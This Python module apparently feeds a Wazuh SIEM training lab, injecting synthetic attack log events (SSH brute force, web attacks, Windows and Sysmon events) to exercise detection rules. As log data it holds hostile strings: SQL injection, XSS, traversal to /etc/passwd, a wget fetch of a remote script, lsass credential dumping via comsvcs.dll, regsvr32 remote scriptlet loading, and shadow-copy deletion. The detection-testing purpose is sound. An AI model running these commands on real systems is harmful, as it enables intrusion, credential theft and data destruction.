"""Scenario injector — writes labeled attack events to the analysisd queue socket.

Only event templates whose rules were VERIFIED to fire on the live manager (and
to carry data.srcip, so the attack map / triage sees a source) are included:

  sshd_invalid  -> rule 5710  groups[sshd,authentication_failed]  -> bruteforce
  sshd_failed   -> rule 5716/5710                                 -> bruteforce
  web_sqli      -> rule 31106 groups[web,accesslog,attack]        -> webattack
  web_xss       -> rule 31106                                     -> webattack
  web_traversal -> rule 31106                                     -> webattack
  web_cmdinj    -> rule 31106                                     -> webattack

A message is: `1:[<agentid>] (<agentname>) any-><location>:<raw log line>`.
Everything runs ON the Wazuh manager (the queue socket is a local UNIX socket).
"""
import json
import socket
import threading
import time
import random

import config

USERS = ["admin", "root", "test", "oracle", "ubuntu", "postgres", "git",
         "ftpuser", "deploy", "guest", "support", "www-data"]

# Windows identities used when a scenario step doesn't pin one via $TOKENs.
WIN_USERS = ["administrator", "jsmith", "adunn", "svc_backup", "helpdesk",
             "mwallace", "kperry", "operator", "sqladmin", "guest"]
WIN_SERVICES = ["svc_sql", "svc_web", "svc_backup", "MSSQLSvc", "svc_share",
                "svc_ldap", "svc_report", "http_svc"]

_SECURE = "any->/var/log/secure"
_ACCESS = "any->/var/log/apache2/access.log"
_WINEVT = "any->EventChannel"

_SEC_PROVIDER = "Microsoft-Windows-Security-Auditing"
_SEC_GUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"
_SYSMON_PROVIDER = "Microsoft-Windows-Sysmon"
_SYSMON_GUID = "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"


def _ts():
    return time.strftime("%b %d %H:%M:%S")


def _apache_ts():
    return time.strftime("%d/%b/%Y:%H:%M:%S +0000")


def _win_ts():
    return time.strftime("%Y-%m-%dT%H:%M:%S.000000000Z", time.gmtime())


def _winevt(event_id, computer, eventdata, provider=_SEC_PROVIDER,
            guid=_SEC_GUID, channel="Security", severity="AUDIT_FAILURE",
            message=""):
    """Build one Windows EventChannel JSON log (decoded by the json decoder;
    matched by the training_rules.xml 100100+ pack)."""
    ev = {"win": {
        "system": {
            "providerName": provider, "providerGuid": guid,
            "eventID": str(event_id), "channel": channel,
            "computer": computer, "systemTime": _win_ts(),
            "severityValue": severity, "message": message or "Windows event.",
            "eventRecordID": str(random.randint(100000, 9999999)),
        },
        "eventdata": eventdata,
    }}
    return _WINEVT, json.dumps(ev)


def _line(template, ip, st=None, computer="host01"):
    """Build one raw log line for a template + source IP.

    `st` is the (already $TOKEN-resolved) inject step, so Windows templates can
    read pinned values (user/service/image/cmd/dstip/file). `computer` is the
    target agent name shown as the Windows host.
    """
    st = st or {}
    pid = random.randint(1000, 65000)
    port = random.randint(1024, 65535)
    user = random.choice(USERS)
    host = "srv"

    # ---- Linux syslog / web (verified: rules 5710/5716 + 31106) ----
    if template == "sshd_invalid":
        return _SECURE, "%s %s sshd[%d]: Failed password for invalid user %s from %s port %d ssh2" % (
            _ts(), host, pid, user, ip, port)
    if template == "sshd_failed":
        return _SECURE, "%s %s sshd[%d]: Failed password for %s from %s port %d ssh2" % (
            _ts(), host, pid, user, ip, port)
    if template == "web_sqli":
        return _ACCESS, '%s - - [%s] "GET /index.php?id=1+UNION+SELECT+username,password+FROM+users HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_xss":
        return _ACCESS, '%s - - [%s] "GET /search?q=<script>document.cookie</script> HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_traversal":
        return _ACCESS, '%s - - [%s] "GET /app?file=../../../../etc/passwd HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_cmdinj":
        return _ACCESS, '%s - - [%s] "GET /ping?host=127.0.0.1;wget+http://45.9.148.3/x.sh HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))

    # ---- Windows Security channel (training_rules.xml 100110-100134) ----
    wuser = st.get("user") or random.choice(WIN_USERS)
    wsvc = st.get("service") or random.choice(WIN_SERVICES)
    if template == "win_logon_fail":          # 4625 network logon failure
        return _winevt(4625, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "status": "0xc000006d", "subStatus": "0xc0000064",
            "logonType": "3", "authenticationPackageName": "NTLM",
            "workstationName": "KALI", "ipAddress": ip, "ipPort": str(port)},
            message="An account failed to log on.")
    if template == "win_rdp_fail":            # 4625 logonType 10 (RDP)
        return _winevt(4625, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "status": "0xc000006d", "subStatus": "0xc0000064",
            "logonType": "10", "authenticationPackageName": "Negotiate",
            "workstationName": "-", "ipAddress": ip, "ipPort": str(port)},
            message="An account failed to log on (RDP).")
    if template == "win_lockout":             # 4740
        return _winevt(4740, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "callerComputerName": "WKS-" + str(random.randint(1, 40))},
            severity="AUDIT_SUCCESS", message="A user account was locked out.")
    if template == "win_kerberoast":          # 4769 RC4 service ticket
        return _winevt(4769, computer, {
            "targetUserName": wuser + "@LAB.LOCAL", "serviceName": wsvc,
            "serviceSid": "S-1-5-21-1-2-3-%d" % random.randint(1100, 1300),
            "ticketOptions": "0x40810000", "ticketEncryptionType": "0x17",
            "ipAddress": "::ffff:" + ip, "ipPort": str(port), "status": "0x0"},
            severity="AUDIT_SUCCESS",
            message="A Kerberos service ticket was requested.")
    if template == "win_asrep":               # 4768 no pre-auth (AS-REP)
        return _winevt(4768, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "preAuthType": "0", "ticketEncryptionType": "0x17",
            "ipAddress": "::ffff:" + ip, "status": "0x0"},
            severity="AUDIT_SUCCESS",
            message="A Kerberos authentication ticket (TGT) was requested.")
    if template == "win_priv_logon":          # 4672
        return _winevt(4672, computer, {
            "subjectUserName": wuser, "subjectDomainName": "LAB",
            "privilegeList": "SeDebugPrivilege\n\t\t\tSeTcbPrivilege"},
            severity="AUDIT_SUCCESS",
            message="Special privileges assigned to new logon.")
    if template == "win_user_add":            # 4720
        return _winevt(4720, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "subjectUserName": "administrator"},
            severity="AUDIT_SUCCESS", message="A user account was created.")
    if template == "win_group_add":           # 4728 / 4732
        return _winevt(4732, computer, {
            "targetUserName": st.get("group") or "Administrators",
            "memberName": "CN=%s,CN=Users,DC=lab" % wuser,
            "subjectUserName": "administrator"},
            severity="AUDIT_SUCCESS",
            message="A member was added to a security-enabled group.")
    if template == "win_service_install":     # 7045
        return _winevt(7045, computer, {
            "serviceName": st.get("service") or "WinToolSvc",
            "imagePath": st.get("image") or "%%SystemRoot%%\\svc%d.exe" % pid,
            "serviceType": "user mode service", "startType": "auto start"},
            channel="System", severity="INFORMATION",
            message="A service was installed in the system.")
    if template == "win_log_cleared":         # 1102
        return _winevt(1102, computer, {
            "subjectUserName": wuser, "subjectDomainName": "LAB"},
            severity="AUDIT_SUCCESS",
            message="The audit log was cleared.")
    if template == "win_lateral_logon":       # 4624 type3 network logon
        return _winevt(4624, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "logonType": "3", "authenticationPackageName": "Kerberos",
            "ipAddress": ip, "ipPort": str(port)},
            severity="AUDIT_SUCCESS",
            message="An account was successfully logged on.")

    # ---- Sysmon channel (training_rules.xml 100140-100161) ----
    if template.startswith("sysmon_"):
        return _sysmon(template, ip, st, computer, pid)

    raise ValueError("unknown template: %s" % template)


def _sysmon(template, ip, st, computer, pid):
    """Sysmon operational-channel events."""
    def evt(eid, data, msg):
        return _winevt(eid, computer, data, provider=_SYSMON_PROVIDER,
                       guid=_SYSMON_GUID,
                       channel="Microsoft-Windows-Sysmon/Operational",
                       severity="INFORMATION", message=msg)
    user = st.get("user") or ("LAB\\" + random.choice(WIN_USERS))
    if template == "sysmon_ps_enc":           # 100141
        return evt(1, {
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "commandLine": st.get("cmd") or "powershell.exe -nop -w hidden -enc SQBFAFgAKA==",
            "user": user, "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe /c start /min", "processId": str(pid)},
            "Process Create.")
    if template == "sysmon_lolbin":           # 100142
        img = st.get("image") or random.choice(
            ["rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe"])
        return evt(1, {
            "image": "C:\\Windows\\System32\\" + img,
            "commandLine": st.get("cmd") or (img + " /s /u /i:http://" + ip + "/a.sct scrobj.dll"),
            "user": user, "parentImage": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
            "parentCommandLine": "WINWORD.EXE /n", "processId": str(pid)},
            "Process Create.")
    if template == "sysmon_creddump":         # 100143
        return evt(1, {
            "image": "C:\\Windows\\System32\\rundll32.exe",
            "commandLine": st.get("cmd") or "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\lsass.dmp full",
            "user": user, "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe", "processId": str(pid)},
            "Process Create.")
    if template == "sysmon_shadow_del":       # 100144
        return evt(1, {
            "image": "C:\\Windows\\System32\\vssadmin.exe",
            "commandLine": st.get("cmd") or "vssadmin.exe delete shadows /all /quiet",
            "user": user, "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe /c", "processId": str(pid)},
            "Process Create.")
    if template == "sysmon_netconn":          # 100150 / 100151
        return evt(3, {
            "image": st.get("image") or "C:\\Users\\Public\\svchost.exe",
            "user": user, "protocol": "tcp", "sourceIp": "10.10.0.%d" % random.randint(20, 40),
            "sourcePort": str(random.randint(49152, 65535)),
            "destinationIp": st.get("dstip") or ip,
            "destinationPort": st.get("dstport") or "443",
            "destinationHostname": st.get("dsthost") or "cdn-edge.example.net"},
            "Network connection detected.")
    if template == "sysmon_file_create":      # 100160 / 100161
        ext = st.get("ext") or ".locked"
        return evt(11, {
            "image": st.get("image") or "C:\\Users\\Public\\enc.exe",
            "targetFilename": "C:\\Users\\%s\\Documents\\file%d%s" % (
                random.choice(WIN_USERS), random.randint(1, 99999), ext),
            "user": user, "processId": str(pid)},
            "File created.")
    raise ValueError("unknown sysmon template: %s" % template)


class Injector:
    """One socket, reused. Thread-safe send with reconnect-on-error."""

    def __init__(self, sock_path=None):
        self.sock_path = sock_path or config.QUEUE_SOCKET
        self._s = None
        self._lock = threading.Lock()

    def _connect(self):
        self._s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self._s.connect(self.sock_path)

    def send(self, agent_id, agent_name, location, raw):
        # location is e.g. "any->/var/log/secure"; final wire msg:
        #   1:[id] (name) any->/path:<raw log>
        msg = "1:[%s] (%s) %s:%s" % (agent_id, agent_name, location, raw)
        with self._lock:
            for attempt in (1, 2):
                try:
                    if self._s is None:
                        self._connect()
                    self._s.send(msg.encode())
                    return
                except OSError:
                    self._s = None
                    if attempt == 2:
                        raise


# --- run tracking (in-memory; a run = one scenario injection) ---
_runs = {}
_runs_lock = threading.Lock()


def run_state(run_id):
    """Return progress for an exact run id, or the latest run of a scenario id."""
    with _runs_lock:
        if run_id in _runs:
            return dict(_runs[run_id])
        # fall back: treat as a scenario id -> most recent run for it
        matches = [(v.get("started", 0), v) for v in _runs.values()
                   if v.get("scenario") == run_id]
        if matches:
            return dict(max(matches, key=lambda m: m[0])[1])
        return {}


def _emit_scenario(run_id, scenario, agents):
    inj = Injector()
    steps = scenario.get("inject", {}).get("steps", [])
    total = 0
    for st in steps:
        total += int(st.get("count", 1))
    with _runs_lock:
        _runs[run_id]["total"] = total
    sent = 0
    for st in steps:
        template = st["template"]
        agent_name = st.get("agent") or random.choice(list(agents))
        agent_id = agents.get(agent_name, "000")
        ips = st.get("srcips") or [st.get("srcip")]
        count = int(st.get("count", 1))
        spacing = st.get("spacing", [3, 10])
        for _ in range(count):
            ip = random.choice([i for i in ips if i]) or "10.10.0.9"
            location, raw = _line(template, ip, st, agent_name)
            try:
                inj.send(agent_id, agent_name, location, raw)
            except OSError as e:
                with _runs_lock:
                    _runs[run_id]["error"] = str(e)
                return
            sent += 1
            with _runs_lock:
                _runs[run_id]["sent"] = sent
            time.sleep(random.uniform(float(spacing[0]), float(spacing[1])))
        # gap between steps
        time.sleep(random.uniform(2, 6))
    with _runs_lock:
        _runs[run_id]["done"] = True


def launch(scenario, agents):
    """Start injecting a scenario in the background. Returns a run id."""
    run_id = "%s-%d" % (scenario["id"], int(time.time()))
    with _runs_lock:
        _runs[run_id] = {"scenario": scenario["id"], "sent": 0, "total": 0,
                         "done": False, "started": time.time()}
    t = threading.Thread(target=_emit_scenario, args=(run_id, scenario, agents), daemon=True)
    t.start()
    return run_id
